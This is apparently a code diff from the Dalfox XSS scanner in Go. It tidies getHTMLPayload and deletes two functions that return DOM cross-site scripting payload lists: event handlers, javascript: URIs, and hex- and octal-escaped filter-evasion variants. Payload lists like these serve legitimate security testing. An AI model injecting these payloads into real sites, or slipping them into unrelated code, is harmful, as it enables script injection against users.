@@ -185,16 +185,12 @@ func getHTMLPayload(ip string) []string {
 	for _, p := range payloadPattern {
 		if strings.Contains(p, "DALFOX_FUNC_VALUE") {
 			for _, pf := range payloadFunc {
-				var pt string
-				pt = strings.Replace(p, "DALFOX_FUNC_VALUE", pf, -1)
+				pt := strings.Replace(p, "DALFOX_FUNC_VALUE", pf, -1)
 				payload = append(payload, pt)
 			}
 		} else {
 			payload = append(payload, p)
 		}
-	}
-	if strings.Contains(ip, "comment") {
-		// TODO add comment payloads
 	}
 	return payload
 }
@@ -278,52 +274,6 @@ func getAttrPayload(ip string) []string {
 			tempPayload = append(tempPayload, "'"+v)
 		}
 		return tempPayload
-	}
-	return payload
-}
-
-func getDOMXSSPayload() []string {
-	payload := []string{
-		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
-		";alert(DALFOX_ALERT_VALUE);",
-		"javascript:alert(DALFOX_ALERT_VALUE)",
-	}
-	return payload
-}
-
-func getDeepDOMXSPayload() []string {
-	payload := []string{
-		"<svg/OnLoad=\"`${prompt`DALFOX_ALERT_VALUE`}`\">",
-		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
-		"alert(DALFOX_ALERT_VALUE)",
-		"prompt(DALFOX_ALERT_VALUE)",
-		"confirm(DALFOX_ALERT_VALUE)",
-		"print(DALFOX_ALERT_VALUE)",
-		";alert(DALFOX_ALERT_VALUE);",
-		"javascript:alert(DALFOX_ALERT_VALUE)",
-		"java%0ascript:alert(DALFOX_ALERT_VALUE)",
-		"data:text/javascript;,alert(DALFOX_ALERT_VALUE)",
-		"<iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
-		"\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
-		"\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
-		"\"><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
-		"\\x27\\x3E\\x3Cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3E",
-		"\\47\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
-		"\"><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
-		"\\x22\\x3e\\x3cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
-		"\\42\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
-		"\"><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
-		"\\x27\\x3e\\x3cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
-		"\\47\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
-		"1 --><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
-		"1 --\\x3e\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
-		"1 --\\76\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
-		"]]><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
-		"]]\\x3e\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
-		"]]\\76\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
-		"</scrIpt><scrIpt>alert(DALFOX_ALERT_VALUE)</scrIpt>",
-		"\\x3c/scrIpt\\x3e\\x3cscript\\x3ealert(DALFOX_ALERT_VALUE)\\x3c/scrIpt\\x3e",
-		"\\74/scrIpt\\76\\74script\\76alert(DALFOX_ALERT_VALUE)\\74/scrIpt\\76",
 	}
 	return payload
 }
